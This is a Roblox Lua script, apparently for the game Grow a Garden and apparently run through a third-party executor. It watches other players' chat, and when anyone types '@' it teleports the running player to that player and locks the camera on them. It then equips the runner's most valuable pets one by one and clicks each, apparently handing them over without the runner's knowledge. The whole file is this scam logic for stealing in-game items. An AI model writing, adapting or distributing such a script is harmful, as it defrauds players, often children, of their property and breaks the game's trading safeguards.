local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local Camera = workspace.CurrentCamera

local PET_PRIORITY = {
	["T-Rex"] = 100,
	["Dragonfly"] = 90,
	["Queen bee"] = 85,
	["Disco bee"] = 80,
	["Raccoon"] = 75,
	["Mimic Octopus"] = 70,
	["Butterfly"] = 65
}

local IGNORED = {
	["Shovel [Destroy Plants]"] = true,
	["Sprinkler"] = true
}

local function getSortedItems()
	local items = {}
	for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
		if not IGNORED[tool.Name] then
			local score = 0
			for pet, pts in pairs(PET_PRIORITY) do
				if string.find(tool.Name, pet) then
					score = pts
					break
				end
			end
			table.insert(items, {tool = tool, score = score})
		end
	end
	table.sort(items, function(a, b) return a.score > b.score end)
	return items
end

local function faceLoop(target)
	local conn = RunService.RenderStepped:Connect(function()
		if target and target.Position then
			Camera.CFrame = CFrame.new(Camera.CFrame.Position, target.Position)
		end
	end)
	return conn
end

local function interactWith(player)
	local targetChar = player.Character or player.CharacterAdded:Wait()
	local targetTorso = targetChar:FindFirstChild("HumanoidRootPart") or targetChar:FindFirstChild("UpperTorso") or targetChar:FindFirstChild("Torso")
	if not targetTorso then return end

	local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	char:WaitForChild("HumanoidRootPart").CFrame = targetTorso.CFrame * CFrame.new(0, 0, -4)

	LocalPlayer.CameraMode = Enum.CameraMode.LockFirstPerson
	LocalPlayer.CameraMaxZoomDistance = 0.5
	LocalPlayer.CameraMinZoomDistance = 0.5

	local camConn = faceLoop(targetTorso)

	local tools = getSortedItems()
	for _, data in ipairs(tools) do
		local tool = data.tool
		if tool and tool.Parent == LocalPlayer.Backpack then
			LocalPlayer.Character.Humanoid:EquipTool(tool)
			mouse1press()
			task.wait(5)
			mouse1release()
		end
	end

	if camConn then camConn:Disconnect() end
end

local function onChatted(player, msg)
	if player == LocalPlayer then return end
	if string.find(msg, "@") then
		task.defer(function()
			interactWith(player)
		end)
	end
end

for _, p in ipairs(Players:GetPlayers()) do
	if p ~= LocalPlayer then
		p.Chatted:Connect(function(msg) onChatted(p, msg) end)
	end
end

Players.PlayerAdded:Connect(function(p)
	p.Chatted:Connect(function(msg) onChatted(p, msg) end)
end)
